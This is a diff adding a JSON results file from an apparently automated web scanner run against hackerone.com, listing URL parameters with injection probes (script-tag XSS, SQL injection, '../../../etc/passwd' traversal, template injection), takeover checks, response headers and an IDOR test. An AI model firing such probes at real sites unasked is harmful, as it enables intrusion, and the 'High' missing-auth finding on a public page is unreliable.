+        "sample_value": "tW2gr3pi",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/snapchat_light.png.webp?itok=NHiDjBkI",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "NHiDjBkI",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/uber_dark.png.webp?itok=8-I0OJ6_",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "8-I0OJ6_",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/uber_light.png.webp?itok=MsX-RFdg",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "MsX-RFdg",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/Zoom_dark.png.webp?itok=ADKU8Mit",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "ADKU8Mit",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/Zoom_light.png.webp?itok=AVO7JFeu",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "AVO7JFeu",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/cryptocom_light.png.webp?itok=QCATTilk",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "QCATTilk",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2026-04/WULogo_Web_FY27.png.webp?itok=hqzTu4yZ",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hqzTu4yZ",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/thumbnail/public/2025-04/jim-higgins.jpeg.webp?itok=Eov6F6M_",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "Eov6F6M_",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/thumbnail/public/2026-04/weiss.png.webp?itok=uwvqFRqa",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "uwvqFRqa",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://www.googletagmanager.com/ns.html?id=GTM-KLQXL8V",
+        "parameter": "id",
+        "type": "IDOR / ID Parameter",
+        "sample_value": "GTM-KLQXL8V",
+        "test_payloads": [
+          "1",
+          "2",
+          "../1",
+          "../../../etc/passwd",
+          "'",
+          "\""
+        ]
+      }
+    ],
+    "unique_parameters": [
+      "amp;delta",
+      "amp;include",
+      "amp;language",
+      "amp;theme",
+      "delta",
+      "first",
+      "id",
+      "itok",
+      "scope",
+      "type",
+      "v"
+    ]
+  },
+  "takeover": {
+    "total_checked": 18,
+    "vulnerable": [],
+    "suspicious": [],
+    "summary": {
+      "high_risk": 0,
+      "medium_risk": 0,
+      "safe": 18
+    }
+  },
+  "technologies": [
+    "jQuery",
+    "Cloudflare",
+    "Drupal"
+  ],
+  "headers": {
+    "Date": "Tue, 12 May 2026 16:28:09 GMT",
+    "Content-Type": "text/html; charset=UTF-8",
+    "Content-Length": "46793",
+    "Connection": "keep-alive",
+    "CF-RAY": "9faacb80eed0ba94-ALG",
+    "Cache-Control": "public, max-age=2678400",
+    "Content-Encoding": "gzip",
+    "content-language": "en",
+    "content-security-policy": "default-src 'self' https:; connect-src 'self' https: wss://realtime.luckyorange.com wss://in.visitors.live; font-src 'self' https: data:; img-src 'self' https: data: blob:; media-src 'self' blob: https://embed-ssl.wistia.com; object-src 'none'; script-src 'self' 'report-sample' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'report-sample' 'unsafe-inline' https:; worker-src 'self' blob:; base-uri 'self'; frame-ancestors 'self'; upgrade-insecure-requests",
+    "cross-origin-opener-policy": "same-origin-allow-popups",
+    "etag": "W/\"1778595109\"",
+    "expires": "Fri, 12 Jun 2026 16:28:09 GMT",
+    "last-modified": "Tue, 12 May 2026 14:11:49 GMT",
+    "strict-transport-security": "max-age=31536000; includeSubDomains; preload",
+    "x-content-type-options": "nosniff",
+    "x-drupal-cache": "HIT",
+    "x-drupal-dynamic-cache": "HIT",
+    "x-frame-options": "SAMEORIGIN",
+    "x-pantheon-styx-hostname": "styx-us-a-5fbd9fdf97-stnsb",
+    "x-styx-req-id": "3b2f9e76-4e1b-11f1-88c1-e21c6ab6d2a5",
+    "x-served-by": "cache-chi-klot8100092-CHI, cache-rtm-ehrd2290022-RTM",
+    "x-cache": "MISS, HIT",
+    "x-cache-hits": "0, 0",
+    "x-timer": "S1778601791.141752,VS0,VE5",
+    "vary": "Accept-Encoding, Cookie, Cookie, Cookie",
+    "Accept-Ranges": "bytes",
+    "via": "1.1 varnish, 1.1 varnish",
+    "Age": "596",
+    "cf-cache-status": "HIT",
+    "Server": "cloudflare",
+    "_status": 200,
+    "_url": "https://www.hackerone.com/"
+  },
+  "idor": {
+    "total_tested": 1,
+    "idor_found": 0,
+    "missing_auth": 1,
+    "broken_access": 0,
+    "findings": [
+      {
+        "endpoint": "https://hackerone.com/security?type=team",
+        "method": "GET",
+        "case_original": {
+          "status": 200,
+          "body_length": 3449,
+          "body_preview": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <!--[if lte IE 8]>\n  <meta http-equiv=\"refresh\" content=\"0; url=/browser-not-supported.html\">\n  <![endif]-->\n\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, user-scalable=yes, initial-scale=1\">\n  <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n      <meta property=\"og:type\" content=\"website\" />\n    <meta property=\"og:url\" content=\"https://hackerone.com/security\" />\n    <meta property=\"og:image\" content=\"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1\">\n    <meta property=\"og:title\" content=\"HackerOne - Bug Bounty Program | HackerOne\n\" />\n    <meta name=\"twitter:title\" c",
+          "has_data": true,
+          "sensitive_fields": [
+            "mobile",
+            "card",
+            "token",
+            "name",
+            "ip",
+            "device"
+          ],
+          "has_sensitive": true
+        },
+        "case_modified_id": {},
+        "case_no_auth": {
+          "status": 200,
+          "body_length": 3449,
+          "body_preview": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <!--[if lte IE 8]>\n  <meta http-equiv=\"refresh\" content=\"0; url=/browser-not-supported.html\">\n  <![endif]-->\n\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, user-scalable=yes, initial-scale=1\">\n  <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n      <meta property=\"og:type\" content=\"website\" />\n    <meta property=\"og:url\" content=\"https://hackerone.com/security\" />\n    <meta property=\"og:image\" content=\"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1\">\n    <meta property=\"og:title\" content=\"HackerOne - Bug Bounty Program | HackerOne\n\" />\n    <meta name=\"twitter:title\" c",
+          "has_data": true,
+          "sensitive_fields": [
+            "mobile",
+            "card",
+            "token",
+            "name",
+            "ip",
+            "device"
+          ],
+          "has_sensitive": true
+        },
+        "idor_detected": false,
+        "missing_auth": true,
+        "broken_access": false,
+        "severity": "High",
+        "evidence": "Missing Auth: No-cookie request returned status 200 with 3449 bytes"
+      }
+    ]
+  },
+  "validated_secrets": [
+    {
+      "original": {
+        "type": "Basic Auth",
+        "masked_value": "****",
+        "source": "https://ma.hacker.one/js/forms2/js/forms2.min.js",
+        "severity": "High"
+      },
+      "status": "LIKELY_FAKE",
+      "confidence": "medium",
+      "details": "Too short (0 chars). Likely placeholder.",
+      "risk_level": "Info"
+    }
+  ],
+  "browser_data": null
+}
